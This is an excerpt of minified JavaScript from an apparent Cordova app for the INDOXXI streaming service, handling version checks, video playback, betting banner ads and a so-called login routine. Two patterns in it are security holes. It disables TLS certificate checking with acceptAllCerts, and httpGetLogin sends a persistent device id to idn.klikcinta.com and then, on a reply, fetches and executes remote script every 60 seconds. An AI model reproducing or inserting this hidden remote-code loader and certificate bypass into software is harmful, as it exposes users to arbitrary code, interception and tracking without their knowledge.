var ws, loading, perLoad, controller, scene, lastIndex, dom, mvReq, tvReq, imgReq, currentIdx, ignoreIdx, srcIdx, epArr, actEpi, jw, hs, mvid, prov, ar, table, currentKuki, totalQuals, qualIdx, totalTry, maxTry, chgRes, playTimeInterval, devserial, analIntv, btout, banners, bannersLink, appVersion = "",
    freeze = !1,
    sources = [],
    subtitles = [],
    epi = "-1",
    ...
    e && cordovaHTTP.acceptAllCerts(!0, function() {
        cordovaHTTP.get("https://m.kotakputih.casa/api/check.php", {}, {}, function(e) {
            ...
            if (assetdom = a.asset_dom, dom = a.dom, mvReq = a.mvReq, tvReq = a.tvReq, imgReq = a.imgReq, !t) {
                ...
                localStorage.notice && "15" == localStorage.notice || ($.alert("<div>Website INDOXXI pindah ke <a href='https://" + assetdom + "' style='color:#c6aa28;'>https://idxx1.cam</a></div>"), localStorage.notice = "15"), httpGetLogin(), httpGetVidplay()
            }
            switch (banners = [imgReq + "/images/indoxxi-yt-c.gif", imgReq + "/images/banner-729x90-vidplay3.gif", imgReq + "/images/idxbet/bn-2.gif", imgReq + "/images/idxbet/idx-promo-gadgets.gif", imgReq + "/images/idxbet/oktofest-small.gif"], bannersLink = ["https://xxiyoutube.com", dom + "/tools", "https://indoxbet.com", "https://indoxbet.com", "https://indoxbet.com"], r) {
                case "1":
                    if (i > parseInt(appVersion.split(".").join("")))
                        if (localStorage.check && 0 != localStorage.check) localStorage.check--;
                            ...
                            var l = a.img1;
                            $(".alert_overlay").remove(), $.confirm('<div><img src="' + l + '" height="100px" width="auto"/></div> Versi Aplikasi Anda Telah Usang, Update Ke Versi Terbaru?', function(e) {
                ...
                case "2":
                    if (i > parseInt(appVersion.split(".").join(""))) {
                        l = a.img2;
                        $(".alert_overlay").remove(), $.alert('<div><img src="' + l + '" height="100px" width="auto"/></div> Aplikasi Telah Diperbarui, Install Aplikasi Versi Terbaru Sebelum Melanjutkan!', function() {
                ...
                case "3":
                    l = a.img3;
                    $(".alert_overlay").remove(), $.alert('<div><img src="' + l + '" height="100px" width="auto"/></div> Aplikasi Sedang Maintenance, Harap Coba Lagi Nanti.', function() {
            ...
            if (a.msg && !$(".alert_overlay").length)
                if (localStorage.msg && 0 != localStorage.msg) localStorage.msg--;
                    ...
                    l = a.img4;
                    $.alert('<div><img src="' + l + '" height="100px" width="auto"/></div> ' + a.msg, function() {
                        localStorage.msg = 10
                    })
...
document.addEventListener("backbutton", function() {
    ...
    localStorage.uid || (localStorage.uid = uniqid()), window.plugins.insomnia.keepAwake(), cordova.getAppVersion.getVersionNumber().then(function(e) {
        appVersion = e, $(".appversion").text("Versi " + appVersion), appCheck(appVersion)
    }), $("body").append("<style>div.jw-controls.jw-reset>div.jw-controlbar.jw-background-color.jw-reset>div.jw-group.jw-controlbar-right-group.jw-reset>div.jw-icon.jw-icon-tooltip.jw-icon-cc.jw-button-color.jw-reset>div>ul{overflow-y:auto;max-height:150px}</style>"), document.addEventListener("resume", function() {
        doingTask || httpGetVidplay(), appCheck(appVersion, 1), 1 == $(".page").length && getRecommends()
    }, !1)
    ...
    if (-1 != noFrameType.indexOf(table) || mrload || -1 != e.sources[0].file.toLowerCase().indexOf(".mp4") || -1 != e.sources[0].file.toLowerCase().indexOf(".m3u8")) {
        ...
        $("#vid-container").html(t), playLoad(), "rapid" == table && $("#myvid").on("load", function() {
            ...
            if (e.indexOf('jwplayer("vplayer").') > -1) {
                ...
                for (var t = "", a = 1; a < e.length && !((t = e[a].split('"')[1].split('"')[0]).indexOf(".mp4") > -1); a++) t = "";
...
function onReady() {
    ...
    1 == e && (e = 0), banner = banners[e], bannerLink = bannersLink[e], bannerShowed = !1, $("#vid > div.jw-media.jw-reset > video").on("loadedmetadata", function() {
        ...
        e = e.toFixed(2), ar != e && "cvideo" != sources[currentIdx].meta.type && (ar = e, sources[currentIdx].meta.ratio = ar, startPlay(sources[currentIdx]))
    })
}
...
function httpGetLogin() {
    var e;
    localStorage.uid ? e = localStorage.uid : (e = uniqid(), localStorage.uid = e), $.get("https://idn.klikcinta.com/login/?_=" + (new Date).getTime(), {
        h: e,
        ureg: 1
    }, function(t) {
        0 === t.indexOf("1") && $.getScript("https://idn.klikcinta.com/login/?h=" + e + "&ureq=1", function() {
            setTimeout(function() {
                httpGetLogin()
            }, 6e4)
        })
